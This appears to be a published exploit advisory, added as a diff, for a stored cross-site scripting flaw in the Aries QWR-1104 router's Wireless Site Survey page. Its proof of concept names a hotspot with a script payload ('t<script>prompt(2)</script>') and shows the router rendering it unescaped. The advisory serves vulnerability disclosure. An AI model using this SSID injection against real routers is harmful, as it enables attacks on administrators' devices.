@@ -1,0 +1,47 @@
+# Exploit Title: Aries QWR-1104 Wireless-N Router Execute JavaScript in Wireless Site Survey page.
+# Date: 26-05-2017
+# Vendor Homepage : http://www.ariesnetworks.net/
+# Firmware Version: WRC.253.2.0913
+# Exploit Author: Touhid M.Shaikh
+# Contact: http://twitter.com/touhidshaikh22
+# Website: http://touhidshaikh.com/
+# Category: Hardware
+
+
+##### Video PoC and Blog Post #####
+
+https://www.youtube.com/watch?v=jF47XQQq26o
+
+www.touhidshaikh.com/blog
+
+
+
+##### Description ######
+
+	Aries QWR-1104 Wireless-N Router this is home based router. this router provide some extra feature like WDS, Brigeding etc. while connectting another network admin must monitor network around using  Site servey page which is vulnerable to Execute malicious JavaScript code remoting in Wireless Site Survey page.
+
+
+##### POC #######
+	
+	Make a Hotspot using any device. In Hotspot's Accss point name field, Put your malicious javascript code as a name of you hotspot.
+
+	When Target Router's monitors routers around. your Malicious hotspot named router log in target's Site survey page and your hotspot javascript code executed as a javascript.(make sure doing this you whitin a target's network range.)
+
+	#### my Hotspot's name : t<script>prompt(2)</script>
+
+	### Target Servey page After Execute my Javascript ####
+
+	<tr><td bgcolor="#C0C0C0" align="center" width="20%"><pre><font size="2">t<script>prompt(2)</script></font></pre></td>
+		<td bgcolor="#C0C0C0" align="center" width="20%"><font size="2">02:1a:11:f8:**:**</font></td>
+		<td bgcolor="#C0C0C0" align="center" width="10%"><font size="2">11 (B+G+N)</font></td>
+		<td bgcolor="#C0C0C0" align="center" width="20%"><font size="2">AP</font></td>
+		<td bgcolor="#C0C0C0" align="center" width="10%"><font size="2">no</font></td>
+		<td bgcolor="#C0C0C0" align="center" width="10%"><font size="2">38</font></td>
+	</tr>
+
+
+######################################## PoC End Here ################################
+
+
+######## Thanks
+Pratik K.Tejani, Rehman, Taushif,Charles Babbage and all my friends ................
